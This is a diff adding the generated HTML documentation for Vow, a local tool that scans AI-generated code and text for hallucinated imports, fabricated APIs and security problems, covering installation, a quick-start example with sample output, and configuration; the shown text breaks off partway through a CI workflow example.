@@ -1,0 +1,3749 @@
+<!DOCTYPE HTML>
+<html lang="en" class="navy" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Vow Documentation</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+        <!-- Google Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+        
+        <!-- Favicon -->
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='80'>🔒</text></svg>">
+        
+        <!-- Meta tags for social sharing -->
+        <meta property="og:title" content="Vow Documentation - Vow Documentation">
+        <meta property="og:description" content="Local-first AI output verification engine. Trust, verified. Locally.">
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://getvow.dev">
+        <meta property="og:image" content="https://getvow.dev/og-image.png">
+        <meta property="og:site_name" content="Vow Documentation">
+        
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="Vow Documentation - Vow Documentation">
+        <meta name="twitter:description" content="Local-first AI output verification engine. Trust, verified. Locally.">
+        <meta name="twitter:image" content="https://getvow.dev/og-image.png">
+        
+        <meta name="description" content="Local-first AI output verification engine. Trust, verified. Locally.">
+        <meta name="keywords" content="ai verification, code analysis, hallucination detection, security scanning, local-first, privacy">
+        <meta name="author" content="Vow Contributors">
+        
+        <!-- Theme color for mobile browsers -->
+        <meta name="theme-color" content="#0a0a0f">
+        <meta name="msapplication-TileColor" content="#0a0a0f">
+        <meta name="description" content="Local-first AI output verification engine. Trust, verified. Locally.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/custom.css">
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="introduction.html">Introduction</a></li><li class="chapter-item expanded affix "><li class="part-title">Getting Started</li><li class="chapter-item expanded "><a href="getting-started/installation.html"><strong aria-hidden="true">1.</strong> Installation</a></li><li class="chapter-item expanded "><a href="getting-started/quick-start.html"><strong aria-hidden="true">2.</strong> Quick Start</a></li><li class="chapter-item expanded affix "><li class="part-title">User Guide</li><li class="chapter-item expanded "><a href="guide/checking-files.html"><strong aria-hidden="true">3.</strong> Checking Files</a></li><li class="chapter-item expanded "><a href="guide/checking-directories.html"><strong aria-hidden="true">4.</strong> Checking Directories</a></li><li class="chapter-item expanded "><a href="guide/ci-cd-integration.html"><strong aria-hidden="true">5.</strong> CI/CD Integration</a></li><li class="chapter-item expanded "><a href="guide/stdin-pipes.html"><strong aria-hidden="true">6.</strong> Stdin and Pipes</a></li><li class="chapter-item expanded affix "><li class="part-title">Analyzers</li><li class="chapter-item expanded "><a href="analyzers/overview.html"><strong aria-hidden="true">7.</strong> Overview</a></li><li class="chapter-item expanded "><a href="analyzers/code-analyzer.html"><strong aria-hidden="true">8.</strong> Code Analyzer</a></li><li class="chapter-item expanded "><a href="analyzers/text-analyzer.html"><strong aria-hidden="true">9.</strong> Text Analyzer</a></li><li class="chapter-item expanded "><a href="analyzers/hallucination-detection.html"><strong aria-hidden="true">10.</strong> Hallucination Detection</a></li><li class="chapter-item expanded "><a href="analyzers/injection-detection.html"><strong aria-hidden="true">11.</strong> Injection & Exfiltration Detection</a></li><li class="chapter-item expanded affix "><li class="part-title">Rules</li><li class="chapter-item expanded "><a href="rules/overview.html"><strong aria-hidden="true">12.</strong> Overview</a></li><li class="chapter-item expanded "><a href="rules/writing-rules.html"><strong aria-hidden="true">13.</strong> Writing Rules</a></li><li class="chapter-item expanded "><a href="rules/built-in-rules.html"><strong aria-hidden="true">14.</strong> Built-in Rules</a></li><li class="chapter-item expanded affix "><li class="part-title">Configuration</li><li class="chapter-item expanded "><a href="configuration/config-file.html"><strong aria-hidden="true">15.</strong> Configuration File</a></li><li class="chapter-item expanded "><a href="configuration/known-packages.html"><strong aria-hidden="true">16.</strong> Known Packages</a></li><li class="chapter-item expanded "><a href="configuration/vowignore.html"><strong aria-hidden="true">17.</strong> Vowignore File</a></li><li class="chapter-item expanded affix "><li class="part-title">Reference</li><li class="chapter-item expanded "><a href="reference/cli-reference.html"><strong aria-hidden="true">18.</strong> CLI Reference</a></li><li class="chapter-item expanded "><a href="reference/output-formats.html"><strong aria-hidden="true">19.</strong> Output Formats</a></li><li class="chapter-item expanded "><a href="reference/trust-score.html"><strong aria-hidden="true">20.</strong> Trust Score</a></li><li class="chapter-item expanded "><a href="reference/exit-codes.html"><strong aria-hidden="true">21.</strong> Exit Codes</a></li><li class="chapter-item expanded affix "><a href="contributing.html">Contributing</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Vow Documentation</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/guanchuan1314/vow" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
+<div class="hero-section">
+  <h1 id="vow" class="hero-title"><a class="header" href="#vow">Vow</a></h1>
+  <p class="hero-tagline">Trust, verified. Locally.</p>
+  <p style="font-size: 1.1rem; color: var(--text-primary); max-width: 600px; margin: 0 auto;">
+    A local-first AI output verification engine that helps you detect hallucinations, security issues, and quality problems in AI-generated code and text.
+  </p>
+</div>
+<h2 id="what-is-vow"><a class="header" href="#what-is-vow">What is Vow?</a></h2>
+<p>Vow is a high-performance command-line tool that analyzes files, directories, or stdin input to identify potential issues in AI-generated content. It uses a combination of advanced analysis techniques to ensure the reliability and security of AI outputs across <strong>20+ programming languages</strong>.</p>
+<div class="feature-grid">
+  <div class="feature-card">
+    <h3 id="-privacy-first"><a class="header" href="#-privacy-first">🔒 Privacy-First</a></h3>
+    <p>All analysis runs locally - no data leaves your machine. Your code and content stay completely private.</p>
+  </div>
+  <div class="feature-card">
+    <h3 id="-lightning-fast"><a class="header" href="#-lightning-fast">⚡ Lightning Fast</a></h3>
+    <p>Parallel processing engine analyzing 35+ files/sec with optimized HashSet lookups and smart file filtering.</p>
+  </div>
+  <div class="feature-card">
+    <h3 id="-accurate-detection"><a class="header" href="#-accurate-detection">🎯 Accurate Detection</a></h3>
+    <p>Advanced heuristics with improved false positive handling and precision-tuned detection algorithms.</p>
+  </div>
+  <div class="feature-card">
+    <h3 id="-extensible"><a class="header" href="#-extensible">🔧 Extensible</a></h3>
+    <p>YAML-based rules system with .vowignore support for project-specific customization.</p>
+  </div>
+  <div class="feature-card">
+    <h3 id="-cicd-ready"><a class="header" href="#-cicd-ready">🏗️ CI/CD Ready</a></h3>
+    <p>JSON, SARIF, and HTML output formats with detailed performance summaries for automated workflows.</p>
+  </div>
+  <div class="feature-card">
+    <h3 id="-trust-scoring"><a class="header" href="#-trust-scoring">📊 Trust Scoring</a></h3>
+    <p>Quantified confidence metrics to guide decision-making and review priorities.</p>
+  </div>
+</div>
+<h2 id="how-it-works"><a class="header" href="#how-it-works">How It Works</a></h2>
+<p>Vow uses a sophisticated multi-stage analysis pipeline with parallel processing:</p>
+<ol>
+<li><strong>Input Processing</strong>: Intelligently reads files, directories, or stdin with .vowignore filtering support</li>
+<li><strong>AI Content Detection</strong>: Identifies likely AI-generated sections using advanced heuristics across 20+ languages</li>
+<li><strong>Multi-Analyzer Pipeline</strong>:
+<ul>
+<li><strong>Code analyzer</strong> for syntax, API validation, and import verification</li>
+<li><strong>Text analyzer</strong> for factual consistency and hallucination detection</li>
+<li><strong>Security scanner</strong> for dangerous patterns and vulnerabilities</li>
+</ul>
+</li>
+<li><strong>Rule Engine</strong>: Applies custom YAML rules for domain-specific requirements</li>
+<li><strong>Trust Scoring</strong>: Calculates confidence metrics using multiple signals and improved false positive handling</li>
+<li><strong>Performance Summary</strong>: Provides detailed timing and processing statistics</li>
+<li><strong>Output</strong>: Structured results in JSON, SARIF, table, or HTML formats</li>
+</ol>
+<h2 id="use-cases"><a class="header" href="#use-cases">Use Cases</a></h2>
+<h3 id="-software-development"><a class="header" href="#-software-development">🔍 Software Development</a></h3>
+<ul>
+<li>Validate AI-generated code before committing to version control</li>
+<li>Check for hallucinated function calls, imports, or API endpoints</li>
+<li>Detect security vulnerabilities in generated code</li>
+<li>Integrate into CI/CD pipelines for automated quality gates</li>
+</ul>
+<h3 id="-content-creation"><a class="header" href="#-content-creation">📝 Content Creation</a></h3>
+<ul>
+<li>Verify factual accuracy in AI-written documentation</li>
+<li>Check for fabricated references, citations, or sources</li>
+<li>Validate technical explanations and tutorials for correctness</li>
+</ul>
+<h3 id="-code-review"><a class="header" href="#-code-review">👥 Code Review</a></h3>
+<ul>
+<li>Augment human code review with automated AI output verification</li>
+<li>Flag potentially problematic AI-generated sections</li>
+<li>Provide trust scores to guide review priorities and focus areas</li>
+</ul>
+<div class="install-section">
+  <h3 id="quick-install"><a class="header" href="#quick-install">Quick Install</a></h3>
+  <p>Get started with Vow in seconds:</p>
+  <pre><code>curl -sSL https://getvow.dev/install.sh | sh</code></pre>
+  <a href="getting-started/installation.html" class="cta-button">Get Started</a>
+</div>
+<h2 id="core-features"><a class="header" href="#core-features">Core Features</a></h2>
+<h3 id="-advanced-analysis"><a class="header" href="#-advanced-analysis">🧠 <strong>Advanced Analysis</strong></a></h3>
+<ul>
+<li><strong>Multi-language support</strong>: Python, JavaScript, TypeScript, Java, Go, Ruby, C, C++, C#, PHP, Swift, Kotlin, R, Scala, Perl, Lua, Dart, Haskell, MQL5, Rust, Shell</li>
+<li><strong>Static code analysis</strong> to detect hallucinated APIs and imports</li>
+<li><strong>Text analysis</strong> to identify potential fabricated information</li>
+<li><strong>Security scanning</strong> to catch dangerous patterns</li>
+<li><strong>Custom rule engine</strong> for domain-specific checks</li>
+<li><strong>Improved false positive handling</strong> with precision-tuned algorithms</li>
+</ul>
+<h3 id="-high-performance"><a class="header" href="#-high-performance">⚡ <strong>High Performance</strong></a></h3>
+<ul>
+<li><strong>Parallel processing</strong> with rayon for optimal CPU utilization</li>
+<li><strong>35+ files per second</strong> analysis speed on typical hardware</li>
+<li><strong>Optimized data structures</strong> with HashSet lookups for fast package verification</li>
+<li><strong>Smart filtering</strong> with .vowignore support to skip unnecessary files</li>
+<li><strong>Configurable limits</strong> for file size, directory depth, and issue count</li>
+</ul>
+<h3 id="-security--privacy"><a class="header" href="#-security--privacy">🛡️ <strong>Security &amp; Privacy</strong></a></h3>
+<ul>
+<li><strong>100% local processing</strong> - no cloud dependencies</li>
+<li><strong>Open source</strong> with transparent algorithms</li>
+<li><strong>Minimal attack surface</strong> with single binary distribution</li>
+<li><strong>No telemetry</strong> or data collection</li>
+</ul>
+<h3 id="-developer-experience"><a class="header" href="#-developer-experience">🚀 <strong>Developer Experience</strong></a></h3>
+<ul>
+<li><strong>Zero configuration</strong> to get started</li>
+<li><strong>Flexible CLI options</strong>: <code>--quiet</code>, <code>--verbose</code>, <code>--max-file-size</code>, <code>--max-depth</code>, <code>--max-issues</code></li>
+<li><strong>Multiple output formats</strong>: JSON, SARIF, table, HTML with performance summaries</li>
+<li><strong>CI/CD integration</strong> with structured JSON output for automated workflows</li>
+<li><strong>Comprehensive documentation</strong> and examples</li>
+</ul>
+<hr />
+<p><strong>Ready to verify your AI outputs?</strong> Head over to the <a href="getting-started/installation.html">Installation Guide</a> to get up and running in minutes, or check out the <a href="getting-started/quick-start.html">Quick Start</a> for a rapid overview of basic usage.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="installation"><a class="header" href="#installation">Installation</a></h1>
+<p>Vow is distributed as a single binary with no dependencies, making installation straightforward on all supported platforms.</p>
+<h2 id="quick-install-1"><a class="header" href="#quick-install-1">Quick Install</a></h2>
+<h3 id="download-pre-built-binaries"><a class="header" href="#download-pre-built-binaries">Download Pre-built Binaries</a></h3>
+<p>The easiest way to install Vow is to download a pre-built binary from our releases page:</p>
+<pre><code class="language-bash"># Linux x86_64
+curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+chmod +x vow
+sudo mv vow /usr/local/bin/
+
+# macOS (Apple Silicon)
+curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-darwin-arm64 -o vow
+chmod +x vow
+sudo mv vow /usr/local/bin/
+
+# macOS (Intel)
+curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-darwin-x86_64 -o vow
+chmod +x vow
+sudo mv vow /usr/local/bin/
+
+# Windows
+# Download vow-windows-x86_64.exe from the releases page
+# Add to your PATH
+</code></pre>
+<h3 id="verify-installation"><a class="header" href="#verify-installation">Verify Installation</a></h3>
+<p>After installation, verify Vow is working correctly:</p>
+<pre><code class="language-bash">vow --version
+</code></pre>
+<p>You should see output like:</p>
+<pre><code>vow 0.1.0
+</code></pre>
+<h2 id="build-from-source"><a class="header" href="#build-from-source">Build from Source</a></h2>
+<p>If you prefer to build from source or need the latest development version:</p>
+<h3 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h3>
+<ul>
+<li>Rust 1.70+ (install from <a href="https://rustup.rs/">rustup.rs</a>)</li>
+<li>Git</li>
+</ul>
+<h3 id="build-steps"><a class="header" href="#build-steps">Build Steps</a></h3>
+<pre><code class="language-bash"># Clone the repository
+git clone https://github.com/guanchuan1314/vow.git
+cd vow
+
+# Build the release binary
+cargo build --release
+
+# The binary will be at target/release/vow
+sudo cp target/release/vow /usr/local/bin/
+</code></pre>
+<h3 id="build-options"><a class="header" href="#build-options">Build Options</a></h3>
+<p>For development builds:</p>
+<pre><code class="language-bash">cargo build  # Debug build (faster compile, slower runtime)
+</code></pre>
+<p>For optimized release builds:</p>
+<pre><code class="language-bash">cargo build --release  # Optimized build
+</code></pre>
+<h2 id="package-managers"><a class="header" href="#package-managers">Package Managers</a></h2>
+<h3 id="homebrew-macoslinux"><a class="header" href="#homebrew-macoslinux">Homebrew (macOS/Linux)</a></h3>
+<pre><code class="language-bash">brew tap guanchuan1314/vow
+brew install vow
+</code></pre>
+<h3 id="cargo"><a class="header" href="#cargo">Cargo</a></h3>
+<pre><code class="language-bash">cargo install vow
+</code></pre>
+<h3 id="arch-linux-aur"><a class="header" href="#arch-linux-aur">Arch Linux (AUR)</a></h3>
+<pre><code class="language-bash">yay -S vow
+</code></pre>
+<h2 id="docker"><a class="header" href="#docker">Docker</a></h2>
+<p>For containerized environments:</p>
+<pre><code class="language-bash"># Run directly
+docker run --rm -v $(pwd):/workspace ghcr.io/guanchuan1314/vow:latest check /workspace
+
+# Build locally
+docker build -t vow .
+docker run --rm -v $(pwd):/workspace vow check /workspace
+</code></pre>
+<h2 id="first-run"><a class="header" href="#first-run">First Run</a></h2>
+<p>After installation, download the required model files:</p>
+<pre><code class="language-bash"># Download default models (~150MB)
+vow setup
+
+# Or specify which models to download
+vow setup --models code,text,security
+</code></pre>
+<p>Models are stored in:</p>
+<ul>
+<li>Linux: <code>~/.local/share/vow/models/</code></li>
+<li>macOS: <code>~/Library/Application Support/vow/models/</code></li>
+<li>Windows: <code>%APPDATA%\vow\models\</code></li>
+</ul>
+<h2 id="updating"><a class="header" href="#updating">Updating</a></h2>
+<h3 id="pre-built-binaries"><a class="header" href="#pre-built-binaries">Pre-built Binaries</a></h3>
+<p>Download the latest version using the same installation method.</p>
+<h3 id="homebrew"><a class="header" href="#homebrew">Homebrew</a></h3>
+<pre><code class="language-bash">brew update &amp;&amp; brew upgrade vow
+</code></pre>
+<h3 id="cargo-1"><a class="header" href="#cargo-1">Cargo</a></h3>
+<pre><code class="language-bash">cargo install vow --force
+</code></pre>
+<h3 id="docker-1"><a class="header" href="#docker-1">Docker</a></h3>
+<pre><code class="language-bash">docker pull ghcr.io/guanchuan1314/vow:latest
+</code></pre>
+<h2 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h2>
+<h3 id="permission-errors"><a class="header" href="#permission-errors">Permission Errors</a></h3>
+<p>If you get permission errors on Linux/macOS:</p>
+<pre><code class="language-bash">sudo chown $(whoami) /usr/local/bin/vow
+chmod +x /usr/local/bin/vow
+</code></pre>
+<h3 id="model-download-issues"><a class="header" href="#model-download-issues">Model Download Issues</a></h3>
+<p>If model downloads fail:</p>
+<pre><code class="language-bash"># Use a different mirror
+vow setup --mirror cn
+
+# Download specific models only
+vow setup --models code
+
+# Skip model validation
+vow setup --no-verify
+</code></pre>
+<h3 id="windows-path-issues"><a class="header" href="#windows-path-issues">Windows PATH Issues</a></h3>
+<p>Add Vow to your PATH:</p>
+<ol>
+<li>Open System Properties → Environment Variables</li>
+<li>Add the directory containing <code>vow.exe</code> to your PATH</li>
+<li>Restart your terminal</li>
+</ol>
+<h2 id="next-steps"><a class="header" href="#next-steps">Next Steps</a></h2>
+<p>Once installed, head to the <a href="getting-started/quick-start.html">Quick Start</a> guide to learn basic usage.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="quick-start"><a class="header" href="#quick-start">Quick Start</a></h1>
+<p>This guide will get you up and running with Vow in just a few minutes. We'll check some AI-generated code and explore the basic features.</p>
+<h2 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h2>
+<p>Make sure you have Vow installed. If not, see the <a href="getting-started/installation.html">Installation</a> guide.</p>
+<h2 id="your-first-check"><a class="header" href="#your-first-check">Your First Check</a></h2>
+<p>Let's start with a simple example. Create a test file with some AI-generated Python code:</p>
+<pre><code class="language-bash"># Create a test file
+cat &lt;&lt; 'EOF' &gt; test_ai_code.py
+import requests
+from nonexistent_lib import magic_function
+
+def fetch_user_data(user_id):
+    """Fetch user data from the API"""
+    # This API endpoint doesn't exist
+    response = requests.get(f"https://api.example.com/v2/users/{user_id}")
+    
+    # Using a function that doesn't exist
+    processed_data = magic_function(response.json())
+    
+    return processed_data
+
+if __name__ == "__main__":
+    data = fetch_user_data(123)
+    print(data)
+EOF
+</code></pre>
+<p>Now let's check this file with Vow:</p>
+<pre><code class="language-bash">vow check test_ai_code.py
+</code></pre>
+<p>You should see output like this:</p>
+<pre><code class="language-json">{
+  "files": [
+    {
+      "path": "test_ai_code.py",
+      "trust_score": 0.3,
+      "issues": [
+        {
+          "rule": "hallucinated-import",
+          "severity": "high",
+          "message": "Import 'nonexistent_lib' not found in known packages",
+          "line": 2,
+          "column": 1
+        },
+        {
+          "rule": "hallucinated-api",
+          "severity": "medium", 
+          "message": "API endpoint 'api.example.com/v2/users' may be fabricated",
+          "line": 6,
+          "column": 25
+        }
+      ]
+    }
+  ],
+  "summary": {
+    "total_files": 1,
+    "files_with_issues": 1,
+    "trust_score_avg": 0.3
+  }
+}
+</code></pre>
+<h2 id="understanding-the-output"><a class="header" href="#understanding-the-output">Understanding the Output</a></h2>
+<p>Let's break down what Vow found:</p>
+<ul>
+<li><strong>Trust Score</strong>: 0.3 (out of 1.0) indicates low confidence in this code</li>
+<li><strong>Hallucinated Import</strong>: <code>nonexistent_lib</code> isn't a real Python package (verified against HashSet of 20+ language package databases)</li>
+<li><strong>Hallucinated API</strong>: The API endpoint looks fabricated</li>
+<li><strong>Severity Levels</strong>: <code>high</code>, <code>medium</code>, <code>low</code>, and <code>info</code></li>
+<li><strong>Performance</strong>: Analysis completed in milliseconds with parallel processing</li>
+</ul>
+<h2 id="different-output-formats"><a class="header" href="#different-output-formats">Different Output Formats</a></h2>
+<p>Vow supports multiple output formats:</p>
+<h3 id="human-readable-format"><a class="header" href="#human-readable-format">Human-readable format</a></h3>
+<pre><code class="language-bash">vow check test_ai_code.py --format table
+</code></pre>
+<pre><code>┌─────────────────┬──────────────┬──────────┬─────────────────────────────────────┐
+│ File            │ Line:Col     │ Severity │ Issue                               │
+├─────────────────┼──────────────┼──────────┼─────────────────────────────────────┤
+│ test_ai_code.py │ 2:1          │ HIGH     │ Import 'nonexistent_lib' not found │
+│ test_ai_code.py │ 6:25         │ MEDIUM   │ API endpoint may be fabricated      │
+└─────────────────┴──────────────┴──────────┴─────────────────────────────────────┘
+
+Trust Score: 0.3/1.0 (Low confidence)
+</code></pre>
+<h3 id="sarif-format-for-cicd"><a class="header" href="#sarif-format-for-cicd">SARIF format (for CI/CD)</a></h3>
+<pre><code class="language-bash">vow check test_ai_code.py --format sarif
+</code></pre>
+<h3 id="html-report"><a class="header" href="#html-report">HTML report</a></h3>
+<pre><code class="language-bash">vow check test_ai_code.py --format html --output report.html
+</code></pre>
+<h2 id="checking-multiple-files"><a class="header" href="#checking-multiple-files">Checking Multiple Files</a></h2>
+<p>Vow can analyze entire directories:</p>
+<pre><code class="language-bash"># Check all files in current directory
+vow check .
+
+# Check specific file types
+vow check . --include "*.py" --include "*.js"
+
+# Exclude certain files
+vow check . --exclude "test_*" --exclude "*.md"
+</code></pre>
+<h2 id="using-stdin"><a class="header" href="#using-stdin">Using Stdin</a></h2>
+<p>You can also pipe content directly to Vow:</p>
+<pre><code class="language-bash"># Check code from clipboard
+pbpaste | vow check --stdin
+
+# Check git diff before committing
+git diff --cached | vow check --stdin --format table
+</code></pre>
+<h2 id="high-performance-analysis"><a class="header" href="#high-performance-analysis">High-Performance Analysis</a></h2>
+<p>Vow is optimized for speed and efficiency:</p>
+<pre><code class="language-bash"># Fast analysis with performance summary
+vow check . --verbose
+
+# Limit analysis scope for faster results
+vow check . --max-file-size 5 --max-depth 3
+
+# Quiet mode for CI/CD (JSON output recommended)
+vow check . --quiet --format json --max-issues 50
+
+# Check specific languages only
+vow check . --include "*.py" --include "*.js" --include "*.go"
+</code></pre>
+<h2 id="new-features--options"><a class="header" href="#new-features--options">New Features &amp; Options</a></h2>
+<p>Vow supports 20+ programming languages and includes these powerful options:</p>
+<pre><code class="language-bash"># Set minimum severity level
+vow check file.py --min-severity medium
+
+# Show only trust score
+vow check file.py --trust-score-only
+
+# Verbose output with performance details
+vow check file.py --verbose
+
+# Use specific analyzers only
+vow check file.py --analyzers code,security
+
+# Limit analysis scope for better performance
+vow check . --max-file-size 10 --max-depth 5 --max-issues 100
+
+# Custom configuration file
+vow check file.py --config custom.yaml
+</code></pre>
+<h3 id="supported-languages"><a class="header" href="#supported-languages">Supported Languages</a></h3>
+<p>Python, JavaScript, TypeScript, Java, Go, Ruby, C, C++, C#, PHP, Swift, Kotlin, R, Scala, Perl, Lua, Dart, Haskell, MQL5, Rust, Shell</p>
+<h2 id="configuration-file"><a class="header" href="#configuration-file">Configuration File</a></h2>
+<p>Create a <code>.vow.yaml</code> file in your project root for persistent configuration:</p>
+<pre><code class="language-yaml"># .vow.yaml
+analyzers:
+  - code
+  - text
+  - security
+
+severity:
+  min_level: medium
+
+performance:
+  max_file_size: 10  # MB
+  max_depth: 5       # directory levels
+  max_issues: 100    # per file
+
+output:
+  format: table
+  show_trust_score: true
+  verbose: false
+
+rules:
+  include:
+    - hallucinated-import
+    - security-pattern
+  exclude:
+    - minor-style-issue
+
+known_packages:
+  python:
+    - requests
+    - flask
+    - django
+  javascript:
+    - react
+    - express
+    - lodash
+</code></pre>
+<h3 id="use-vowignore-for-performance"><a class="header" href="#use-vowignore-for-performance">Use .vowignore for Performance</a></h3>
+<p>Create a <code>.vowignore</code> file to skip unnecessary files:</p>
+<pre><code># .vowignore
+node_modules/
+.venv/
+build/
+dist/
+*.min.js
+test_*.py
+</code></pre>
+<h2 id="cicd-integration"><a class="header" href="#cicd-integration">CI/CD Integration</a></h2>
+<p>Add Vow to your GitHub Actions workflow with JSON output for optimal performance:</p>
+<pre><code class="language-yaml"># .github/workflows/vow-check.yml
+name: AI Output Verification
+on: [push, pull_request]
+
+jobs:
+  vow-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install Vow
+        run: |
+          curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+          chmod +x vow
+          sudo mv vow /usr/local/bin/
+      
